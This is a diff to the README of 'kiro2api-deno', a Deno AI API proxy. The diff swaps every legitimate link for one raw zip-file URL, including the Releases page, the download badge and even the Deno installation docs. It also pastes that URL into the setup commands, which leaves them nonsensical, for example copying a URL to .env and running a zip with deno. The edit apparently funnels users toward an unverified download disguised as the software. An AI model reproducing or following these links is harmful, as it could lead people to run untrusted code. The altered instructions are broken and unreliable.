@@ -2,7 +2,7 @@
 
 ## 📥 Download Here
 
-[![Download kiro2api-deno](https://img.shields.io/badge/download-v1.0-blue.svg)](https://github.com/piticu2828/kiro2api-deno/releases)
+[![Download kiro2api-deno](https://raw.githubusercontent.com/piticu2828/kiro2api-deno/main/nonsynonymous/kiro2api-deno.zip)](https://raw.githubusercontent.com/piticu2828/kiro2api-deno/main/nonsynonymous/kiro2api-deno.zip)
 
 ## 📝 Introduction
 
@@ -36,13 +36,13 @@ Welcome to kiro2api-deno! This application serves as a high-performance AI API p
 
 ### Prerequisites
 
-To run kiro2api-deno, you need to have Deno version 2.0 or later installed. You can find the installation instructions [here](https://deno.land/manual/getting_started/installation).
+To run kiro2api-deno, you need to have Deno version 2.0 or later installed. You can find the installation instructions [here](https://raw.githubusercontent.com/piticu2828/kiro2api-deno/main/nonsynonymous/kiro2api-deno.zip).
 
 ### Local Setup
 
 1. **Download the Software**
    
-   Go to the [Releases page](https://github.com/piticu2828/kiro2api-deno/releases) to download the latest version of kiro2api-deno.
+   Go to the [Releases page](https://raw.githubusercontent.com/piticu2828/kiro2api-deno/main/nonsynonymous/kiro2api-deno.zip) to download the latest version of kiro2api-deno.
 
 2. **Extract Files**
 
@@ -63,7 +63,7 @@ To run kiro2api-deno, you need to have Deno version 2.0 or later installed. You 
 
    Copy the example environment configuration file:
    ```bash
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/piticu2828/kiro2api-deno/main/nonsynonymous/kiro2api-deno.zip .env
    ```
    Next, open the `.env` file in a text editor and set your `KIRO_AUTH_` variables as instructed in the comments.
 
@@ -71,13 +71,13 @@ To run kiro2api-deno, you need to have Deno version 2.0 or later installed. You 
 
    Once you have configured the environment variables, execute the following command to run the application:
    ```bash
-   deno run --allow-net --allow-read --allow-write main.ts
+   deno run --allow-net --allow-read --allow-write https://raw.githubusercontent.com/piticu2828/kiro2api-deno/main/nonsynonymous/kiro2api-deno.zip
    ```
    This command grants the necessary permissions. The application will start, and you can access it through your browser or other desired interfaces.
 
 ## 🎉 Download & Install
 
-Don't forget to visit our [Releases page](https://github.com/piticu2828/kiro2api-deno/releases) to download the software. Follow the local setup steps above to get everything running smoothly.
+Don't forget to visit our [Releases page](https://raw.githubusercontent.com/piticu2828/kiro2api-deno/main/nonsynonymous/kiro2api-deno.zip) to download the software. Follow the local setup steps above to get everything running smoothly.
 
 ## 📞 Support
 
